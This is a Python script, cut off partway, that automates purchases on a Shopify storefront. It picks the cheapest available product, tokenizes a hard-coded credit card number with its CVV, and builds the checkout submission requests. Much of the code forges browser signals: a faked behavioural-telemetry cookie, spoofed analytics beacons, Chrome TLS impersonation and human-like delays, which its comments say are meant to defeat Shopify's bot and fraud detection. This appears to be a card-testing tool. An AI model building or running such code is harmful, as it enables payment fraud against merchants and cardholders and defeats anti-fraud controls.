from curl_cffi import requests as curl_requests
import re
import json
import uuid
import random
import time
import base64
from html import unescape
from urllib.parse import urlparse, quote
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


DOMAIN = "https://kays-media.myshopify.com"
BUILD_ID = None  # Will be extracted dynamically from checkout page
PROPOSAL_QUERY_ID = "503a9d1b8635d850516d7e003332e0b753810205dba8def3c04d44f60717fd4b"
SUBMIT_QUERY_ID = "f586499475fb35b20f5dd02584ff2d437432b3628133bef6a8fba6c979aff643"
POLL_RECEIPT_QUERY_ID = "2f6b14ade727374065e7c7ac82c69f85460c9c41a40b98246066f0fea41d7d7d"

def extract_build_id(html):
    """Extract the checkout web build ID from checkout page HTML.
    Found in serialized-environment meta tag as commitSha."""
    commit_match = re.search(r'commitSha&quot;:&quot;([a-f0-9]{20,})&quot;', html)
    if commit_match:
        return commit_match.group(1)
    commit_match2 = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{20,})"', html)
    if commit_match2:
        return commit_match2.group(1)
    return None

def extract_checkout_session_id(html):
    """Extract the checkout session identifier from the checkout page."""
    match = re.search(r'serialized-checkoutSessionIdentifier"\s+content="&quot;([^&]+)&quot;"', html)
    if match:
        return match.group(1)
    match2 = re.search(r'serialized-checkoutSessionIdentifier"\s+content="([^"]+)"', html)
    if match2:
        raw = match2.group(1).replace('&quot;', '').strip()
        return raw
    return None

def extract_shop_id(html):
    """Extract the numeric shop ID from checkout page HTML."""
    m = re.search(r'gid://shopify/Shop/(\d+)', html)
    if m:
        return int(m.group(1))
    return None

def extract_api_client_id(html):
    """Extract the API client ID from checkout page."""
    m = re.search(r'serialized-apiClientId["\s]+content="(\d+)"', html)
    if m:
        return int(m.group(1))
    return None

def extract_checkout_assets(html, shop_url):
    """Extract JS/CSS asset URLs from checkout page for preloading."""
    assets = []
    for m in re.finditer(r'(?:src|href)="(/cdn/shopifycloud/checkout-web/assets/[^"]+)"', html):
        assets.append(f"{shop_url}{m.group(1)}")
    return assets

def preload_checkout_assets(session, shop_url, checkout_token, assets):
    """Fetch key checkout page assets to simulate browser behavior.
    Real browsers load JS/CSS, creating server-side request logs that
    Shopify's bot detection uses as legitimacy signals."""
    if not assets:
        return
    
    priority_keywords = ['vendor.', 'app.', 'Trekkie.', 'polyfill', 'monorail.', 'app.B']
    priority_assets = [a for a in assets if any(kw in a for kw in priority_keywords)]
    css_assets = [a for a in assets if a.endswith('.css') and 'app.' in a]
    selected = (priority_assets + css_assets)[:6]  # max 6 assets
    
    if not selected:
        selected = assets[:3]  # fallback: first 3 assets
    
    load_headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer": f"{shop_url}/checkouts/cn/{checkout_token}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "no-cors",
        "sec-fetch-site": "same-origin",
    }
    
    loaded = 0
    for asset_url in selected:
        try:
            if asset_url.endswith('.css'):
                load_headers["sec-fetch-dest"] = "style"
            else:
                load_headers["sec-fetch-dest"] = "script"
            session.get(asset_url, headers=load_headers, timeout=8)
            loaded += 1
        except:
            pass
    print(f"  Preloaded {loaded}/{len(selected)} checkout assets")

def send_trekkie_beacon(session, shop_url, checkout_token, shop_id=0, api_client_id=0, page_type="checkout"):
    """Send Trekkie-style analytics beacons to simulate real browser tracking.
    Shopify's fraud detection checks for these as proof of browser activity."""
    parsed = urlparse(shop_url)
    domain = parsed.netloc
    
    now_ms = int(time.time() * 1000)
    page_load_ms = now_ms - random.randint(800, 2500)  # Page loaded 0.8-2.5s ago
    
    try:
        uniq_token = session.cookies.get("_shopify_y") or uuid.uuid4().hex[:32]
    except:
        uniq_token = uuid.uuid4().hex[:32]
    try:
        visit_token = session.cookies.get("_shopify_s") or uuid.uuid4().hex[:32]
    except:
        visit_token = uuid.uuid4().hex[:32]
    micro_session_id = str(uuid.uuid4())
    navigation_type = "navigate"
    checkout_path = f"/checkouts/cn/{checkout_token}"
    
    base_headers = {
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": shop_url,
        "Referer": f"{shop_url}{checkout_path}/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }
    
    monorail_url = "https://monorail-edge.shopifysvc.com/v1/produce"
    monorail_headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Accept": "*/*",
        "Origin": shop_url,
        "Referer": f"{shop_url}/",
        "User-Agent": base_headers["User-Agent"],
        "sec-ch-ua": base_headers["sec-ch-ua"],
        "sec-ch-ua-mobile": base_headers["sec-ch-ua-mobile"],
        "sec-ch-ua-platform": base_headers["sec-ch-ua-platform"],
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }
    
    monorail_payload = {
        "schema_id": "trekkie_storefront_page_view/3.1",
        "payload": {
            "shopId": shop_id,
            "appName": "checkout",
            "path": checkout_path,
            "referrer": f"{shop_url}/",
            "navigationType": navigation_type,
            "navigationStart": page_load_ms,
            "firstPaintMs": random.randint(200, 600),
            "firstContentfulPaintMs": random.randint(300, 800),
            "startTime": page_load_ms,
            "endTime": now_ms,
            "duration": now_ms - page_load_ms,
            "isMerchantRequest": False,
            "uniqToken": uniq_token,
            "visitToken": visit_token,
            "microSessionId": micro_session_id,
            "microSessionCount": 1,
            "isPersistentCookie": True,
            "contentLanguage": "en",
            "checkoutToken": checkout_token,
            "apiClientId": api_client_id,
            "timestamp": now_ms,
        },
        "metadata": {
            "event_created_at_ms": now_ms,
            "event_sent_at_ms": now_ms
        }
    }
    
    try:
        r = session.post(monorail_url, json=monorail_payload, headers=monorail_headers, timeout=10)
        print(f"  Monorail beacon: {r.status_code}")
    except Exception as e:
        print(f"  Monorail beacon failed (non-critical): {e}")
    
    collect_url = f"{shop_url}/checkouts/internal/collect"
    
    internal_events = {
        "events": [
            {
                "schema_id": "checkout_started/1.0",
                "payload": {
                    "checkout_token": checkout_token,
                    "timestamp": now_ms,
                    "page_type": page_type,
                    "source": "web",
                    "shopId": shop_id
                },
                "metadata": {
                    "event_created_at_ms": now_ms
                }
            },
            {
                "schema_id": "trekkie_storefront_page_view/3.1",
                "payload": {
                    "shopId": shop_id,
                    "appName": "checkout",
                    "path": checkout_path,
                    "isMerchantRequest": False,
                    "uniqToken": uniq_token,
                    "visitToken": visit_token,
                    "microSessionId": micro_session_id,
                    "microSessionCount": 1,
                    "isPersistentCookie": True,
                    "contentLanguage": "en",
                    "checkoutToken": checkout_token,
                    "apiClientId": api_client_id,
                    "timestamp": now_ms,
                    "navigationType": navigation_type,
                    "navigationStart": page_load_ms,
                    "firstPaintMs": random.randint(200, 600),
                    "firstContentfulPaintMs": random.randint(300, 800),
                },
                "metadata": {
                    "event_created_at_ms": now_ms
                }
            }
        ],
        "metadata": {
            "event_sent_at_ms": now_ms
        }
    }
    
    try:
        r = session.post(collect_url, json=internal_events, headers=base_headers, timeout=10)
        print(f"  Internal collect beacon: {r.status_code}")
    except Exception as e:
        print(f"  Internal collect failed (non-critical): {e}")


CARD = {
    "number": "5449630584002473",
    "month": 11,
    "year": 2033,
    "verification_value": "484",
    "name": "James Anderson"
}
CHECKOUT_DATA = {
    "email": "stevenson7193@gmail.com",
    "first_name": "James",
    "last_name":  "Anderson",
    "address1": "4024 College Point Boulevard",
    "address2": "",
    "city": "Flushing",
    "province": "NY",
    "zip":  "11354",
    "country": "US",
    "phone": "+17185558234"
}
HTTP_TIMEOUT_SHORT = 10

SESSION_STABLE_ID = str(uuid.uuid4())

def generate_keep_alive_cookie():
    """
    Generate a fake keep_alive cookie with behavioral telemetry data.
    This simulates the mouse movements, clicks, and keyboard activity
    that Shopify's checkout tracks.
    """
    now_ms = int(time.time() * 1000)
    session_start = now_ms - random.randint(30000, 120000)  # Session started 30-120s ago
    session_duration = (now_ms - session_start) // 1000
    
    keep_alive_data = {
        "v": 2,
        "ts": now_ms,
        "env": {
            "wd": 0,
            "ua": 1,
            "cv": 1,
            "br": 1
        },
        "bhv": {
            "ma": random.randint(80, 150),  # Mouse actions
            "ca": random.randint(5, 15),     # Click actions
            "ka": random.randint(60, 120),   # Keyboard actions
            "sa": random.randint(20, 50),    # Scroll actions
            "kba": 0,
            "ta": 0,
            "t": session_duration,           # Time on page
            "nm": 1,
            "ms": round(random.uniform(0.2, 0.5), 2),
            "mj": round(random.uniform(0.5, 0.9), 2),
            "msp": round(random.uniform(0.3, 0.7), 2),
            "vc": 1,
            "cp": round(random.uniform(0.4, 0.6), 2),
            "rc": 0,
            "kj": round(random.uniform(1.5, 2.5), 2),
            "ki": round(random.uniform(4000, 6000), 2),
            "ss": round(random.uniform(0.3, 0.7), 2),
            "sj": round(random.uniform(0.3, 0.7), 2),
            "ssm": round(random.uniform(0.7, 0.95), 2),
            "sp": random.randint(2, 5),
            "ts": 0,
            "tj": 0,
            "tp": 0,
            "tsm": 0
        },
        "ses": {
            "p": 1,
            "s": session_start,
            "d": session_duration
        }
    }
    
    json_str = json.dumps(keep_alive_data, separators=(',', ':'))
    return base64.b64encode(json_str.encode()).decode()

def format_amount(amount):
    """Format amount to always have 2 decimal places"""
    try:
        return f"{float(amount):.2f}"
    except (ValueError, TypeError):
        return str(amount)

def create_session(shop_url):
    """Create a curl_cffi Session with Chrome TLS fingerprint impersonation."""
    session = curl_requests.Session(impersonate="chrome131")
    session.timeout = 30
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
    })
    session.verify = False
    parsed = urlparse(shop_url)
    domain = parsed.netloc
    
    session.cookies.set("localization", "US", domain=domain)
    session.cookies.set("cart_currency", "USD", domain=domain)
    
    tracking_consent = quote(json.dumps({
        "con": {"CMP": {"a": "", "m": "", "p": "", "s": ""}},
        "v": "2.1",
        "region": "USNY",
        "reg": "",
        "purposes": {"a": True, "p": True, "m": True, "t": True}
    }, separators=(',', ':')))
    session.cookies.set("_tracking_consent", tracking_consent, domain=domain)
    
    now_iso = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    session.cookies.set("_shopify_sa_t", now_iso, domain=domain)
    session.cookies.set("_shopify_sa_p", "", domain=domain)
    
    keep_alive = generate_keep_alive_cookie()
    session.cookies.set("keep_alive", keep_alive, domain=domain, path="/")
    
    return session

def random_delay(min_ms=100, max_ms=500):
    """Add random delay to simulate human behavior"""
    time.sleep(random.uniform(min_ms/1000, max_ms/1000))

def auto_detect_cheapest_product(session, shop_url, max_pages=10):
    """Fetch products with pagination (250 per page max) and find the cheapest available variant."""
    all_products = []
    page = 1
    
    while page <= max_pages:
        url = f"{shop_url}/products.json?limit=250&page={page}"
        try:
            r = session.get(url)
            if r.status_code != 200:
                break
            data = r.json()
            products = data.get('products', [])
            if not products:
                break 
            all_products.extend(products)
            print(f"  Fetched page {page}: {len(products)} products (total: {len(all_products)})")
            if len(products) < 250:
                break  
            page += 1
        except Exception as e:
            print(f"  Error fetching page {page}: {e}")
            break
    
    if not all_products:
        return None
    
  
    candidates = []
    for product in all_products:
        for variant in product.get('variants', []):
      
            available = variant.get('available')
            if available is None:
               
                inv_qty = variant.get('inventory_quantity', 0)
                inv_policy = (variant.get('inventory_policy') or '').lower()
                available = (inv_qty > 0) or (inv_policy == 'continue')
            
            if not available:
                continue
            
            try:
                price = float(variant.get('price', 0))
            except (ValueError, TypeError):
                price = 0
            
            if price <= 0:
                continue
            
            candidates.append({
                "product_id": product['id'],
                "product_gid": f"gid://shopify/Product/{product['id']}",
                "variant_id": variant['id'],
                "variant_price": variant['price'],
                "variant_price_float": price,
                "product_title": product['title'],
                "variant_sku": variant.get('sku', ''),
                "variant_gid": f"gid://shopify/ProductVariant/{variant['id']}",
                "variant_merch_gid": f"gid://shopify/ProductVariantMerchandise/{variant['id']}",
                "requires_shipping": variant.get('requires_shipping', True),
            })
    
    if not candidates:
        return None
    
  
    candidates.sort(key=lambda x: x['variant_price_float'])
    print(f"  Found {len(candidates)} available variants, cheapest: ${candidates[0]['variant_price_float']:.2f}")
    return candidates[0]

def extract_session_token(html):
    meta_pattern = r'<meta\s+name="serialized-sessionToken"\s+content="([^"]+)"'
    meta_match = re.search(meta_pattern, html)
    if meta_match:
        content = unescape(meta_match.group(1))
        token = content.strip('"').strip()
        if len(token) > 50:
            print(f"  [OK] Session token extracted (length: {len(token)})")
            return token
    print("  [WARNING] Session token not found")
    return None

def step1_add_to_cart(session, shop_url, variant_id):
    global BUILD_ID
    parsed = urlparse(shop_url)
    domain = parsed.netloc
    
    keep_alive = generate_keep_alive_cookie()
    session.cookies.set("keep_alive", keep_alive, domain=domain)
    print(f"  DEBUG: Set keep_alive cookie (simulating user behavior)")
    
    random_delay(300, 800)
    try:
        session.get(f"{shop_url}/", timeout=15)
    except:
        pass
    
    random_delay(200, 600)  # Simulate human delay
    add_url = f"{shop_url}/cart/add.js"
    payload = {"id": variant_id, "quantity": 1}
    add_headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': shop_url,
        'Referer': f'{shop_url}/',
    }
    session.post(add_url, json=payload, headers=add_headers)
    
    random_delay(300, 800)  # Delay before checkout
    checkout_url = f"{shop_url}/checkout"
    r = session.get(checkout_url, allow_redirects=True)
    
    html_text = r.text
    
    extracted_build_id = extract_build_id(html_text)
    if extracted_build_id:
        BUILD_ID = extracted_build_id
        print(f"  [OK] Extracted BUILD_ID: {BUILD_ID}")
    else:
        BUILD_ID = "7626ff72837697320572a06fe93441d2864c3b84"  # fallback
        print(f"  [WARN] Could not extract BUILD_ID, using fallback")
    
    checkout_session_id = extract_checkout_session_id(html_text)
    if checkout_session_id:
        print(f"  [OK] Checkout session ID: {checkout_session_id}")
    
    shop_id = extract_shop_id(html_text) or 0
    api_client_id = extract_api_client_id(html_text) or 0
    if shop_id:
        print(f"  [OK] Shop ID: {shop_id}")
    if api_client_id:
        print(f"  [OK] API Client ID: {api_client_id}")
    
    checkout_assets = extract_checkout_assets(html_text, shop_url)
    if checkout_assets:
        print(f"  [OK] Found {len(checkout_assets)} checkout assets")
    
    keep_alive = generate_keep_alive_cookie()
    session.cookies.set("keep_alive", keep_alive, domain=domain)
    
    final_url = r.url if hasattr(r, 'url') else checkout_url
    final_url = str(final_url)
    checkout_token = None
    session_token = None
    
    print(f"  DEBUG: Final URL = {final_url[:80]}...")
    print(f"  DEBUG: Response length = {len(html_text)}")
    
    if '/checkouts/cn/' in final_url:
        checkout_token = final_url.split('/checkouts/cn/')[1].split('/')[0]
    elif '/checkouts/' in final_url:
        parts = final_url.split('/checkouts/')
        if len(parts) > 1:
            checkout_token = parts[1].split('/')[0]
    
    session_token = extract_session_token(html_text)
    
    extra_data = {
        "shop_id": shop_id,
        "api_client_id": api_client_id,
        "checkout_assets": checkout_assets,
        "checkout_session_id": checkout_session_id,
    }
    
    print(f"  DEBUG: Cookies after checkout:")
    for cookie_name in session.cookies.jar:
        print(f"    {cookie_name.name} = {cookie_name.value[:60]}..." if len(str(cookie_name.value)) > 60 else f"    {cookie_name.name} = {cookie_name.value}")
    
    return checkout_token, session_token, r.cookies, extra_data

def step2_tokenize_card(session, shop_url, card_data):
    random_delay(200, 500)  # Delay before card tokenization
    scope_host = urlparse(shop_url).netloc
    payload = {
        "credit_card":  {
            "number": card_data["number"],
            "month": card_data["month"],
            "year": card_data["year"],
            "verification_value": card_data["verification_value"],
            "name": card_data["name"]
        },
        "payment_session_scope": scope_host
    }
    headers = {
        "Origin": "https://checkout.pci.shopifyinc.com",
        "Referer": "https://checkout.pci.shopifyinc.com/",
        "Content-Type": "application/json",
        "Accept": "application/json",
        "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '\"Windows\"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors"
    }
    r = session.post("https://checkout.pci.shopifyinc.com/sessions", json=payload, headers=headers)
    if r.status_code == 200:
        return r.json().get("id")
    return None

def proposal_query():
    return """
query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$queueToken:String,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput,$tip:TipTermInput,$note:NoteInput){
  session(sessionInput:$sessionInput){
    negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships,tip:$tip,note:$note},queueToken:$queueToken}){
      result{
        __typename
        ... on NegotiationResultAvailable{
          queueToken
          sellerProposal{
            checkoutTotal{
              ... on MoneyValueConstraint{
                value{
                  amount
                  currencyCode
                }
              }
            }
            subtotalBeforeTaxesAndShipping{
              ...on MoneyValueConstraint{
                value{
                  amount
                  currencyCode
                }
              }
            }
            deliveryExpectations{
              __typename
              ...on FilledDeliveryExpectationTerms{
                deliveryExpectations{
                  signedHandle
                  __typename
                }
              }
              ...on PendingTerms{
                pollDelay
              }
            }
            delivery{
              __typename
              ...on FilledDeliveryTerms{
                deliveryLines{
                  availableDeliveryStrategies{
                    ... on CompleteDeliveryStrategy{
                      handle
                      amount{
                        ... on MoneyValueConstraint{
                          value{
                            amount
                            currencyCode
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            payment{
              __typename
              ...on FilledPaymentTerms{
                availablePaymentLines{
                  paymentMethod{
                    __typename
                    ...on PaymentProvider{
                      paymentMethodIdentifier
                    }
                  }
                }
              }
            }
            taxes{
              __typename
              ...on FilledTaxTerms{
                totalTaxAmount{
                  ...on MoneyValueConstraint{
                    value{
                      amount
                      currencyCode
                    }
                  }
                }
                totalTaxIncludedAmount{
                  ...on MoneyValueConstraint{
                    value{
                      amount
                      currencyCode
                    }
                  }
                }
              }
            }
          }
        }
        ... on NegotiationResultFailed{
          reportable
        }
      }
    }
  }
}
"""

def submit_for_completion_query():
    return """
mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){
  submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){
    __typename
    ...on SubmitSuccess{
      receipt{
        __typename
        ... on ProcessedReceipt{
          id
          token
          orderIdentity{
            id
            buyerIdentifier
          }
        }
        ... on ProcessingReceipt{
          id
          pollDelay
        }
      }
    }
    ...on SubmitAlreadyAccepted{
      receipt{
        __typename
        ...on ProcessedReceipt{
          id
          token
          orderIdentity{
            id
            buyerIdentifier
          }
        }
        ...on ProcessingReceipt{
          id
          pollDelay
        }
      }
    }
    ...on SubmittedForCompletion{
      receipt{
        __typename
        ...on ProcessedReceipt{
          id
          token
          orderIdentity{
            id
            buyerIdentifier
          }
        }
        ...on ProcessingReceipt{
          id
          pollDelay
        }
      }
    }
    ...on SubmitFailed{
      reason
    }
    ...on SubmitRejected{
      errors{
        code
        localizedMessage
      }
    }
    ...on Throttled{
      pollAfter
    }
  }
}
"""

def poll_for_receipt_query():
    return """
query PollForReceipt($receiptId:ID!,$sessionToken:String!){
  receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){
    __typename
    ...on ProcessedReceipt{
      id
      token
      redirectUrl
      orderIdentity{
        buyerIdentifier
        id
      }
    }
    ...on ProcessingReceipt{
      id
      pollDelay
    }
    ...on WaitingReceipt{
      id
      pollDelay
    }
    ...on FailedReceipt{
      id
      processingError{
        __typename
        ...on PaymentFailed{
          code
          messageUntranslated
        }
      }
    }
  }
}
"""

def get_shipping_address(include_coordinates=False, for_submission=False):
    """Get shipping/billing address matching exact browser format.
    No coordinates, no oneTimeUse, phone always empty string."""
    return {
        "address1": CHECKOUT_DATA["address1"],
        "address2": CHECKOUT_DATA["address2"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": ""
    }

def get_billing_address():
    """Get billing address matching exact browser format."""
    return {
        "address1": CHECKOUT_DATA["address1"],
        "address2": CHECKOUT_DATA["address2"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": ""
    }

def build_submission_input(session_token, variant_info, delivery_handle, merchandise_amount, shipping_amount, checkout_total, card_session_id, payment_method_identifier, queue_token, checkout_token, delivery_expectations=None, delivery_method_type="SHIPPING", tax_amount=None):
    
    is_digital = (delivery_method_type == "NONE")
    
    billing_address = get_billing_address()
    merchandise_line_stable_id = SESSION_STABLE_ID
    
    if is_digital:
        delivery_line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True}
                },
                "options": {}
            },
            "targetMerchandiseLines": {"lines": [{"stableId": merchandise_line_stable_id}]},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True
        }
        delivery_expectation_lines = []  # Always empty for digital
    else:
        shipping_address = get_shipping_address()
        delivery_line = {
            "destination": {"streetAddress": shipping_address},
            "selectedDeliveryStrategy": {
                "deliveryStrategyByHandle": {
                    "handle": delivery_handle,
                    "customDeliveryRate": False
                },
                "options": {}
            },
            "targetMerchandiseLines": {"lines": [{"stableId": merchandise_line_stable_id}]},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": "USD"}},
            "destinationChanged": False
        }
        delivery_expectation_lines = []
        if delivery_expectations:
            for exp in delivery_expectations:
                if "signedHandle" in exp:
                    delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    input_data = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True
        },
        "deliveryExpectations": {
            "deliveryExpectationLines": delivery_expectation_lines
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_line_stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": variant_info["variant_merch_gid"],
                        "variantId": variant_info["variant_gid"],
                        "properties": [],
                        "sellingPlanId": None,
                        "sellingPlanDigest": None  
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"value": {"amount": format_amount(merchandise_amount), "currencyCode": "USD"}},
                "lineComponentsSource": None,
                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "totalAmount": {"any": True},
            "paymentLines": [{
                "paymentMethod": {
                    "directPaymentMethod": {
                        **({"paymentMethodIdentifier": payment_method_identifier} if payment_method_identifier else {}),
                        "sessionId": card_session_id,
                        "billingAddress": {"streetAddress": billing_address},
                        "cardSource": None
                    },
                    "giftCardPaymentMethod": None,
                    "redeemablePaymentMethod": None,
                    "walletPaymentMethod": None,
                    "walletsPlatformPaymentMethod": None,
                    "localPaymentMethod": None,
                    "paymentOnDeliveryMethod": None,
                    "paymentOnDeliveryMethod2": None,
                    "manualPaymentMethod": None,
                    "customPaymentMethod": None,
                    "offsitePaymentMethod": None,
                    "customOnsitePaymentMethod": None,
                    "deferredPaymentMethod": None,
                    "customerCreditCardPaymentMethod": None,
                    "paypalBillingAgreementPaymentMethod": None,
                    "remotePaymentInstrument": None
                },
                "amount": {"value": {"amount": format_amount(checkout_total), "currencyCode": "USD"}}
            }],
            "billingAddress": {"streetAddress": billing_address}
        },
        "buyerIdentity": {
            "customer": {"presentmentCurrency": "USD", "countryCode": "US"},
            "email": CHECKOUT_DATA["email"],
            "emailChanged": False,
            "phoneCountryCode": "US",
            "marketingConsent": [{"email": {"value": CHECKOUT_DATA["email"]}}],
            "shopPayOptInPhone": {
                "countryCode": "US"
            },
            "rememberMe": False
        },
        "tip": {"tipLines": []},
        "taxes": {
            "proposedAllocations": None,
            "proposedTotalAmount": (
                {"value": {"amount": format_amount(tax_amount), "currencyCode": "USD"}}
                if tax_amount is not None and float(tax_amount) > 0
                else {"any": True}
            ),
            "proposedTotalIncludedAmount": None,
            "proposedMixedStateTotalAmount": None,
            "proposedExemptions": []
        },
        "note": {"message": None, "customAttributes": []},
        "localizationExtension": {"fields": []},
        "nonNegotiableTerms": None,
        "scriptFingerprint": {
            "signature": None,
            "signatureUuid": None,
            "lineItemScriptChanges": [],
            "paymentScriptChanges": [],
            "shippingScriptChanges": []
        },
        "optionalDuties": {"buyerRefusesDuties": False},
        "cartMetafields": []
    }
    
    return input_data

def proposal_variables_generic(session_token, variant_info, delivery_handle, payment_any=True, payment_amount=None, card_session_id=None, payment_method_identifier=None, use_partial_address=False, destination_changed=False, queue_token=None, delivery_expectations=None, shipping_amount=None, use_any_merchandise=False, delivery_method_type="SHIPPING"):
    billing_address = get_billing_address()
    merchandise_line_stable_id = SESSION_STABLE_ID
    
    is_digital = (delivery_method_type == "NONE")
    
    delivery_expectation_lines = []
    if not is_digital and delivery_expectations:
        for exp in delivery_expectations:
            if "signedHandle" in exp:
                delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    if is_digital:
        delivery_line = {
            "selectedDeliveryStrategy": {
                "deliveryStrategyMatchingConditions": {
                    "estimatedTimeInTransit": {"any": True},
                    "shipments": {"any": True}
                },
                "options": {}
            },
            "targetMerchandiseLines": (
                {"any": True} if use_any_merchandise
                else {"lines": [{"stableId": merchandise_line_stable_id}]}
            ),
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {"any": True},
            "destinationChanged": True
        }
    else:
        shipping_address = get_shipping_address()
        if use_partial_address:
            destination = {"partialStreetAddress": shipping_address}
        else:
            destination = {"streetAddress": shipping_address}
        delivery_line = {
            "destination": destination,
            "selectedDeliveryStrategy": {
                "deliveryStrategyByHandle": {
                    "handle": delivery_handle,
                    "customDeliveryRate": False
                },
                "options": {}
            },
            "targetMerchandiseLines": (
                {"any": True} if use_any_merchandise
                else {"lines": [{"stableId": merchandise_line_stable_id}]}
            ),
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": (
                {"any": True}
                if payment_any or (shipping_amount is None)
                else {"value": {"amount": format_amount(shipping_amount), "currencyCode": "USD"}}
            ),
            "destinationChanged": destination_changed
        }
    
    variables = {
        "sessionInput": {"sessionToken": session_token},
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "useProgressiveRates": False,
            "prefetchShippingRatesStrategy": None,
            "supportsSplitShipping": True
        },
        "deliveryExpectations": {
            "deliveryExpectationLines": delivery_expectation_lines
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_line_stable_id,
                "merchandise": {
                    "productVariantReference":  {
                        "id": variant_info["variant_merch_gid"],
                        "variantId": variant_info["variant_gid"],
                        "properties": [],
                        "sellingPlanId": None,
                        "sellingPlanDigest": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": (
                    {"any": True}
                    if payment_any or (payment_amount is None)
                    else {"value": {"amount": format_amount(payment_amount), "currencyCode": "USD"}}
                ),
                "lineComponentsSource": None,
                "lineComponents": []
            }]
        },
        "memberships": {"memberships": []},
        "payment": {
            "billingAddress": {"streetAddress": billing_address},
            "totalAmount": (
                {"any": True}
                if payment_any or (payment_amount is None)
                else {"value": {"amount": format_amount(payment_amount), "currencyCode": "USD"}}
            ),
            "paymentLines": (
                []
                if payment_any or (card_session_id is None)
                else [{
                    "paymentMethod":  {
                        "directPaymentMethod": {
                            **({"paymentMethodIdentifier": payment_method_identifier} if payment_method_identifier else {}),
                            "sessionId":  card_session_id,
